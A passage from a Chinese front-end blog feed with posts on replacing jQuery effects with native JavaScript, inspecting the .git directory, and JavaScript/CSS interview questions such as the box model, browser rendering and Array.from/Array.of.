&#x27;none&#x27;;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-2-Toggle"><a href="#8-2-Toggle" class="headerlink" title="8.2 Toggle"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.2">8.2</a> Toggle</h4><p>显示或隐藏元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.toggle();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">if (el.ownerDocument.defaultView.getComputedStyle(el, null).display === &#x27;none&#x27;) &#123;</span><br><span class="line">  el.style.display = &#x27;&#x27;|&#x27;inline&#x27;|&#x27;inline-block&#x27;|&#x27;inline-table&#x27;|&#x27;block&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  el.style.display = &#x27;none&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-3-FadeIn-amp-FadeOut"><a href="#8-3-FadeIn-amp-FadeOut" class="headerlink" title="8.3 FadeIn &amp; FadeOut"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.3">8.3</a> FadeIn &amp; FadeOut</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.fadeIn(3000);</span><br><span class="line">$el.fadeOut(3000);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.style.transition = &#x27;opacity 3s&#x27;;</span><br><span class="line">// fadeIn</span><br><span class="line">el.style.opacity = &#x27;1&#x27;;</span><br><span class="line">// fadeOut</span><br><span class="line">el.style.opacity = &#x27;0&#x27;;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-4-FadeTo"><a href="#8-4-FadeTo" class="headerlink" title="8.4 FadeTo"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.4">8.4</a> FadeTo</h4><p>调整元素透明度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.fadeTo(&#x27;slow&#x27;,0.15);</span><br><span class="line">// Native</span><br><span class="line">el.style.transition = &#x27;opacity 3s&#x27;; // 假设 &#x27;slow&#x27; 等于 3 秒</span><br><span class="line">el.style.opacity = &#x27;0.15&#x27;;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-5-FadeToggle"><a href="#8-5-FadeToggle" class="headerlink" title="8.5 FadeToggle"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.5">8.5</a> FadeToggle</h4><p>动画调整透明度用来显示或隐藏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.fadeToggle();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.style.transition = &#x27;opacity 3s&#x27;;</span><br><span class="line">const &#123; opacity &#125; = el.ownerDocument.defaultView.getComputedStyle(el, null);</span><br><span class="line">if (opacity === &#x27;1&#x27;) &#123;</span><br><span class="line">  el.style.opacity = &#x27;0&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  el.style.opacity = &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-6-SlideUp-amp-SlideDown"><a href="#8-6-SlideUp-amp-SlideDown" class="headerlink" title="8.6 SlideUp &amp; SlideDown"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.6">8.6</a> SlideUp &amp; SlideDown</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.slideUp();</span><br><span class="line">$el.slideDown();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">const originHeight = &#x27;100px&#x27;;</span><br><span class="line">el.style.transition = &#x27;height 3s&#x27;;</span><br><span class="line">// slideUp</span><br><span class="line">el.style.height = &#x27;0px&#x27;;</span><br><span class="line">// slideDown</span><br><span class="line">el.style.height = originHeight;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-7-SlideToggle"><a href="#8-7-SlideToggle" class="headerlink" title="8.7 SlideToggle"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.7">8.7</a> SlideToggle</h4><p>滑动切换显示或隐藏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.slideToggle();</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">const originHeight = &#x27;100px&#x27;;</span><br><span class="line">el.style.transition = &#x27;height 3s&#x27;;</span><br><span class="line">const &#123; height &#125; = el.ownerDocument.defaultView.getComputedStyle(el, null);</span><br><span class="line">if (parseInt(height, 10) === 0) &#123;</span><br><span class="line">  el.style.height = originHeight;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line"> el.style.height = &#x27;0px&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="8-8-Animate"><a href="#8-8-Animate" class="headerlink" title="8.8 Animate"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#8.8">8.8</a> Animate</h4><p>执行一系列 CSS 属性动画。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$el.animate(&#123; params &#125;, speed);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">el.style.transition = &#x27;all &#x27; + speed;</span><br><span class="line">Object.keys(params).forEach((key) =&gt;</span><br><span class="line">  el.style[key] = params[key];</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>探索 .git 目录</title>
      <link href="/Blog/2019/04/04/shell/%E6%8E%A2%E7%B4%A2git%E7%9B%AE%E5%BD%95/index/"/>
      <url>/Blog/2019/04/04/shell/%E6%8E%A2%E7%B4%A2git%E7%9B%AE%E5%BD%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="文件-git-HEAD"><a href="#文件-git-HEAD" class="headerlink" title="文件 .git/HEAD"></a>文件 <code>.git/HEAD</code></h2><blockquote><p>查看 cat .git&#x2F;HEAD<br>ref：refs&#x2F;heads&#x2F;master</p></blockquote><p>此文件是一个引用，记录当前分支</p><h2 id="文件-git-config"><a href="#文件-git-config" class="headerlink" title="文件 .git/config"></a>文件 <code>.git/config</code></h2><blockquote><p>查看 cat .git&#x2F;config</p></blockquote><p>此文件记录当前git配置（用户名及邮箱等）</p><hr><p>查看 git 文件类型</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">cat</span><span class="operator">-file</span> <span class="literal">-t</span> 编码</span><br></pre></td></tr></table></figure><p>查看 git 文件内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">cat</span><span class="operator">-file</span> <span class="literal">-p</span> 编码</span><br></pre></td></tr></table></figure><hr><h2 id="文件夹-git-refs"><a href="#文件夹-git-refs" class="headerlink" title="文件夹 .git/refs"></a>文件夹 <code>.git/refs</code></h2><p>里面有 <code>heads</code> 和 <code>tags</code> 目录<br>head 有一个最近的master<br>输入 cat master 查看文件内容为 <code>git</code> 文件<br>输入 git cat-file -t 编码 查看该文件类型为 commit<br>输入 git cat-file -p 编码 发现内容为最近的一次 commit 的具体内容</p><h2 id="文件夹-git-objects"><a href="#文件夹-git-objects" class="headerlink" title="文件夹 .git/objects"></a>文件夹 <code>.git/objects</code></h2><p>里面有很多两个字符的文件夹和 <code>info</code> 和 <code>pack</code></p><blockquote><p><code>pack</code> 的作用是 <code>git</code> 的自我梳理过程，如果里面的松散文件过多，会打包到这里</p></blockquote><p>另外以两个字符的文件夹机制是这样的：</p><p><img src="/Blog/2019/04/04/shell/%E6%8E%A2%E7%B4%A2git%E7%9B%AE%E5%BD%95/index/img.png"></p><p>组合查看具体文件类型及内容</p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>今日份面试题整理</title>
      <link href="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/"/>
      <url>/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/</url>
      
        <content type="html"><![CDATA[<h5 id="1-以下关于盒子模型描述正确的是：（-）"><a href="#1-以下关于盒子模型描述正确的是：（-）" class="headerlink" title="1.以下关于盒子模型描述正确的是：（ ）"></a>1.以下关于盒子模型描述正确的是：（ ）</h5><p>A.标准盒子模型中：盒子的总宽度 ＝ 左右margin + 左右border + 左右padding + width<br>B.IE盒子模型中：盒子总宽度 ＝ 左右margin + 左右border + width<br>C.标准盒子模型中：盒子的总宽度 ＝ 左右margin + 左右border + width<br>D.IE盒子模型中：盒子总宽度 ＝ width</p><p>分析：盒子模型都是：左右margin + 左右border + 左右padding + width，IE和标准盒子的区别在于content的内容，IE的content包括width和border。</p><p><img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/img.png" alt="标准W3C盒子模型"></p><p><img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/img_1.png" alt="IE盒子模型"></p><h5 id="2-关于正则表达式声明6位数字的邮编，以下代码正确的是（-）"><a href="#2-关于正则表达式声明6位数字的邮编，以下代码正确的是（-）" class="headerlink" title="2.关于正则表达式声明6位数字的邮编，以下代码正确的是（    ）"></a>2.关于正则表达式声明6位数字的邮编，以下代码正确的是（    ）</h5><p>A. var  reg &#x3D; &#x2F;\d6&#x2F;;<br>B. var  reg &#x3D; \d{6};<br>C. var  reg &#x3D; &#x2F;\d{6}&#x2F;;<br>D. var  reg &#x3D; new RegExp(“\d{6}”);</p><p>分析：炸一看C、D都对，实验后发现new出来的需要对 \ 符号进行转义，正确写法：new RegExp(“\\d{6}”)。</p><h5 id="3-CSS中-link-和-import-的区别是？（-）"><a href="#3-CSS中-link-和-import-的区别是？（-）" class="headerlink" title="3.CSS中 link 和@import 的区别是？（ ）"></a>3.CSS中 link 和@import 的区别是？（ ）</h5><p>A、link属于HTML标签，而@import是CSS提供的;<br>B、页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;<br>C、import只在IE5以上才能识别，而link是HTML标签，无兼容问题;<br>D、@import方式的样式的权重高于link的权重;</p><p>分析：属于XHTML没有任何疑议，主要在于D选项犹豫。1. link方式：写在html文档head里面。2.@import方式：写在css文档里面引入样式表。在自己写栗子时并没有发现import高于link权重问题，经过资料的搜集总算整明白，爱好奇的你一定想<a href="https://www.cnblogs.com/my--sunshine/p/6872224.html">点击这里</a>。</p><h5 id="4-在css中，能够去掉项目列表符号的属性是（-）"><a href="#4-在css中，能够去掉项目列表符号的属性是（-）" class="headerlink" title="4.在css中，能够去掉项目列表符号的属性是（ ）"></a>4.在css中，能够去掉项目列表符号的属性是（ ）</h5><p>A.list-style-image 属性<br>B.list-style-position属性<br>C.list-style属性<br>D.list-style-type属性</p><p>分析：写了这么多年的css一直没注意list-style是一个复合的属性，list-style-type只是其中的一项。语法：list-style : list-style-image || list-style-position || list-style-type。</p><h5 id="5-什么是-Window-对象-什么是-Document-对象"><a href="#5-什么是-Window-对象-什么是-Document-对象" class="headerlink" title="5.什么是 Window 对象? 什么是 Document 对象?"></a>5.什么是 Window 对象? 什么是 Document 对象?</h5><p>BOM:<br>Browser Object Model:浏览器对象模型，用来访问和操纵浏览器窗口，使js有能力与浏览器“对话”，通过使用BOM，可移动窗口、更改状态文本、执行其他不与页面内容发生直接联系第操作，且没有相关标准，但被广泛支持。<br>1、外部对象就是浏览器提供（内部）的API<br>2、这些对象由W3C规定，由浏览器开发者设计并开发<br>3、这些对象分为2部分，其中BOM包含了DOM<br>4、我们可以通过js访问这些对象</p><ul><li>栗子：<br>Window对象：-alert(),confirm(),prompt(“”)。-setTimeout(),clearTimeout()。-setInterval(),clearInterval()。<br>SCREEN对象：-width&#x2F;height。-availWidth&#x2F;availHeight…<br>History对象：-history对象包含用户访问过的URL，-length属性:浏览器历史列表中的URL数量，-back()，-forward()，-go(num)。<br>location对象：–location对象包含有关当前URL的信息，–href属性:当前窗口正在浏览的网页地址，-reload():重写载入当前网址，按下刷新按钮。<br>navigator对象：–navigator对象包含有关浏览器的信息。</li></ul><p>DOM:<br>Document Object Model：文档对象模型，用来操作文档<br>–定义了访问和操作HTML文档的标准方法<br>–应用程序通过对DOM树的操作，来实现对HTML文档数据第操作。</p><ul><li>栗子：<br>document.getElementById()，-parentNode，-childNodes……..各节点操作。</li></ul><p><img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/img_2.png"></p><h5 id="6-请简述浏览器的渲染原理"><a href="#6-请简述浏览器的渲染原理" class="headerlink" title="6.请简述浏览器的渲染原理"></a>6.请简述浏览器的渲染原理</h5><p>这次简单聊聊我对浏览器的渲染机制的理解。首先需要提到几个基本概念：<br>DOM：Document Object Model，浏览器将HTML解析成树形的数据结构，简称DOM。<br>CSSOM：CSS Object Model，浏览器将CSS解析成树形的数据结构，简称CSSOM。<br>Render Tree: DOM和CSSOM合并后生成Render Tree，如下图：</p><p><img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/img_3.png" alt="浏览器渲染机制"></p><p>Layout: 计算出Render Tree每个节点的具体位置。<br>Painting：通过显卡，将Layout后的节点内容分别呈现到屏幕上。</p><p>下面我们来说说具体的流程。 <br>如何通过url获取对应的html文件的过程我就不详细介绍了，不熟悉的同学可以看看<a href="http://blog.csdn.net/mevicky/article/details/46789381">输入url到页面返回的全过程</a></p><p>当我们的浏览器获得html文件后，会<strong>自上而下</strong>的加载，并在加载过程中进行解析和渲染。 <br><strong>加载</strong>说的就是<strong>获取资源文件</strong>的过程，如果在加载的过程中，遇到外部css文件和图片，浏览器会另外发出一个请求，来获取css文件和相应的图片，这个请求是<strong>异步的</strong>，并不会影响html文件。 <br>但是如果遇到javascript文件，html文件会<strong>挂起渲染的线程，等待javascript加载完毕后，html文件再继续渲染</strong>。</p><p>为什么html需要等待javascript呢？因为javascript可能会修改DOM，导致后续的html资源白白加载，所以html必须等待javascript文件加载完毕后，再继续渲染。这也就是为什么<strong>javascript文件要写在底部body标签前</strong>的原因。</p><p>好了，接下来我们介绍<strong>渲染</strong>的细节，html的渲染过程就是将html代码按照**<a href="http://blog.csdn.net/mevicky/article/details/45921567">深度优先遍历</a>**来生成DOM树。 <br>css文件下载完后也会进行渲染，生成相应的CSSOM。 <br>当所有的css文件下载完且所有的CSSOM构建结束后，就会和DOM一起生成Render Tree。 <br>接下来，浏览器就会进入Layout环节，将所有的节点位置计算出来。 <br>最后，通过Painting环节将所有的节点内容呈现到屏幕上。</p><p>我们理解的<strong>重排和重绘</strong>也就是分别触发了Layout环节和Painting环节。现在是不是清晰多了呢？</p><p>当然，每个浏览器对于渲染的实现机制都不相同，比如说chrome会在一开始就将不影响DOM结构的javascript也异步加载从而进一步提高性能等。以上的过程也只是我个人的理解，如果有什么不严谨的地方，还望大神提出。</p><h5 id="7-一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？"><a href="#7-一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？" class="headerlink" title="7.一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？"></a>7.一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？</h5><p>同上蓝色。</p><h5 id="8-举例说明下Array-from和Array-of的用法"><a href="#8-举例说明下Array-from和Array-of的用法" class="headerlink" title="8.举例说明下Array.from和Array.of的用法"></a>8.举例说明下Array.from和Array.of的用法</h5><ul><li>1. Array.from()</li></ul><p>Array.from方法用于将两类对象转为真正的数组：类数组的对象（ array-like object ）和可遍历（ iterable ）的对象（包括 ES6 新增的<a href="http://es6.ruanyifeng.com/#docs/array">数据结构</a> Set 和Map ）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">let arrayLike = &#123;  </span><br><span class="line">　　<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">　　<span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,  </span><br><span class="line">　　<span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,  </span><br><span class="line">　　length: <span class="number">3</span>  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="regexp">//</span> ES5 的写法  </span><br><span class="line">var arr1 = [].slice.call(arrayLike); <span class="regexp">//</span> [‘a‘, ‘b‘, ‘c‘]  </span><br><span class="line"><span class="regexp">//</span> ES6 的写法  </span><br><span class="line">let arr2 = Array.from(arrayLike); <span class="regexp">//</span> [‘a‘, ‘b‘, ‘c‘]  </span><br><span class="line">  </span><br><span class="line"><span class="regexp">//</span> NodeList 对象  </span><br><span class="line">let ps = document.querySelectorAll(<span class="string">&#x27;p&#x27;</span>);  </span><br><span class="line">Array.from(ps).forEach(<span class="keyword">function</span> (p) &#123;  </span><br><span class="line">　　console.log(p);  </span><br><span class="line">&#125;);  </span><br><span class="line"><span class="regexp">//</span> arguments 对象  </span><br><span class="line"><span class="keyword">function</span> foo() &#123;  </span><br><span class="line">var args = Array.from(arguments);  </span><br><span class="line"><span class="regexp">//</span> ...  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>字符串转换为字符数组str.split(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">Array.from(<span class="string">&#x27;hello&#x27;</span>)  <span class="regexp">//</span> [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]  </span><br><span class="line">let namesSet = new Set([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])  </span><br><span class="line">Array.from(namesSet) <span class="regexp">//</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">Array.from(&#123; length: <span class="number">3</span> &#125;);  <span class="regexp">//</span> [ undefined, undefined, undefined ]  </span><br></pre></td></tr></table></figure><p>对于还没有部署该方法的浏览器，可以用Array.prototype.slice方法替代：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const toArray = <span class="function">(<span class="params">(</span>) =&gt;</span></span><br><span class="line">  <span class="built_in">Array</span>.from ? <span class="built_in">Array</span>.from : <span class="function"><span class="params">obj</span> =&gt;</span> [].<span class="built_in">slice</span>.call(obj)</span><br><span class="line">)();</span><br></pre></td></tr></table></figure><p>Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.<span class="keyword">from</span>(arrayLike, x =&gt; x * x);  </span><br><span class="line"><span class="regexp">//</span>  等同于  </span><br><span class="line"><span class="built_in">Array</span>.<span class="keyword">from</span>(arrayLike).map(x =&gt; x * x);  </span><br><span class="line"><span class="built_in">Array</span>.<span class="keyword">from</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="function"><span class="params">(x)</span> =&gt;</span> x * x)  </span><br><span class="line"><span class="regexp">//</span> [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>]  </span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Array.from回调函数</span></span><br><span class="line"><span class="keyword">var</span> arr1 = <span class="built_in">Array</span>.from([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], <span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> item*item;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="built_in">Array</span>.from([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]).<span class="built_in">map</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> item*item;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="built_in">Array</span>.from([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], (item) =&gt; item*item);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(arr1); <span class="comment">//[ 1, 4, 9 ]</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(arr2); <span class="comment">//[ 1, 4, 9 ]</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(arr3); <span class="comment">//[ 1, 4, 9 ]</span></span><br></pre></td></tr></table></figure><ul><li><ol start="2"><li>Array.of()</li></ol></li></ul><p>Array.of方法用于将一组值，转换为数组。Array.of总是返回参数值组成的数组。如果没有参数，就返回一个空数组。<br>Array.of基本上可以用来替代Array()或new Array()，并且不存在由于参数不同而导致的重载。它的行为非常统一。<br>这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Array</span><span class="params">()</span></span> <span class="comment">// []  </span></span><br><span class="line"><span class="function"><span class="title">Array</span><span class="params">(<span class="number">3</span>)</span></span> <span class="comment">// [, , ,]  </span></span><br><span class="line"><span class="function"><span class="title">Array</span><span class="params">(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>)</span></span> <span class="comment">// [3, 11, 8]  </span></span><br><span class="line">  </span><br><span class="line">Array<span class="selector-class">.of</span>() <span class="comment">// []  </span></span><br><span class="line">Array<span class="selector-class">.of</span>(<span class="number">3</span>) <span class="comment">// [3]  </span></span><br><span class="line">Array<span class="selector-class">.of</span>(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]  </span></span><br><span class="line">  </span><br><span class="line">Array<span class="selector-class">.of</span>(<span class="number">3</span>)<span class="selector-class">.length</span> <span class="comment">// 1   </span></span><br><span class="line">Array<span class="selector-class">.of</span>(undefined) <span class="comment">// [undefined]  </span></span><br><span class="line">Array<span class="selector-class">.of</span>(<span class="number">1</span>) <span class="comment">// [1]  </span></span><br><span class="line">Array<span class="selector-class">.of</span>(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// [1, 2]  </span></span><br></pre></td></tr></table></figure><p>Array.of方法可以用下面的代码模拟实现：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">ArrayOf</span>()&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">[].slice.call(arguments)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>似乎都可用于数组的转换 <strong>&#x3D;.&#x3D;</strong><br><img src="/Blog/2019/03/29/interview/%E4%BB%8A%E6%97%A5%E4%BB%BD%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index/img_4.png" alt="噼里啪啦噼里啪啦"><blockquote><p><strong>补充：</strong><br><strong>fill()填充数组</strong><br><strong>fill()使用给定值，填充一个数组。</strong></p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].fill(<span class="number">7</span>)</span><br><span class="line">document.write(arr);  <span class="comment">// [7, 7, 7]</span></span><br><span class="line"> </span><br><span class="line">let <span class="keyword">new</span><span class="type">Arr</span> = <span class="keyword">new</span> <span class="type">Array</span>(<span class="number">3</span>).fill(<span class="number">7</span>)</span><br><span class="line">document.write(<span class="keyword">new</span><span class="type">Arr</span>);  <span class="comment">// [7, 7, 7]</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="9-ES6新增遍历数组的实例方法有哪几个？"><a href="#9-ES6新增遍历数组的实例方法有哪几个？" class="headerlink" title="9.ES6新增遍历数组的实例方法有哪几个？"></a>9.ES6新增遍历数组的实例方法有哪几个？</h5><p>ES6提供三个新的方法：</p><ul><li>entries()</li><li>keys()</li><li>values()<br>用于遍历数组。它们都返回一个遍历器，可以用for…of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (let index of [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>].keys()) &#123;</span><br><span class="line">  document.write(index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (let elem of [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>].values()) &#123;</span><br><span class="line">  document.write(elem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&#x27;b&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (let [index, elem] of [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>].entries()) &#123;</span><br><span class="line">  